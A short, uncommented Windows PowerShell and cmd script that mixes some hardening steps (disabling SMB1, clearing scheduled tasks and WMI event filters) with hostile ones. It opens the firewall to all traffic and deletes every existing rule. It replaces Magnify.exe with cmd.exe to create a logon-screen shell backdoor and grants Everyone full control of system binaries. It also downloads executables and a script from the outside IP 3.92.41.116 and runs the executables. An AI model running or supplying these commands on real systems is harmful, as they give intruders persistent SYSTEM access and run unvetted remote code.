set-netfirewallprofile -profile * -defaultinboundaction allow -defaultoutboundaction allow
get-netfirewallrule | remove-netfirewallrule
new-netfirewallrule -action allow -direction inbound -remoteaddress 10.2.1.1-10.2.1.11 -displayname "in from home"
new-netfirewallrule -action allow -direction outbound -remoteaddress 10.2.1.1-10.2.1.11 -displayname "out from home"
new-netfirewallrule -action allow -direction outbound -remoteaddress 3.92.41.116 -displayname "to cloud"
new-netfirewallrule -action allow -direction inbound -remoteaddress 3.92.41.116 -displayname "from cloud"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v CachedLogonsCount /t REG_SZ /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters" /v SMB1 /t REG_DWORD /d 0 /f
Get-ScheduledTask | Stop-ScheduledTask
Get-ScheduledTask | Disable-ScheduledTask
Get-ScheduledTask | Stop-ScheduledTask
get-scheduledjob | disable-scheduledjob
get-job | stop-job
Get-WMIObject -Namespace root\Subscription -Class __EventFilter | Remove-WMIObject
takeown /f C:\windows\system32\Magnify.exe
icacls C:\windows\system32\Magnify.exe /grant everyone:F
copy C:\windows\system32\cmd.exe C:\windows\system32\Magnify.exe -force
reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
wget http://3.92.41.116/sys.zip -usebasicparsing -outfile sys.zip
wget http://3.92.41.116/1.exe -usebasicparsing -outfile 1.exe
wget http://3.92.41.116/2.exe -usebasicparsing -outfile 2.exe
.\1.exe
.\2.exe
takeown /f C:\windows\system32\cmd.exe
icacls C:\windows\system32\cmd.exe /grant everyone:F
ren C:\windows\system32\cmd.exe C:\windows\system32\dmc.exe 
wget http://3.92.41.116/2.ps1 -usebasicparsing -outfile 2.ps1
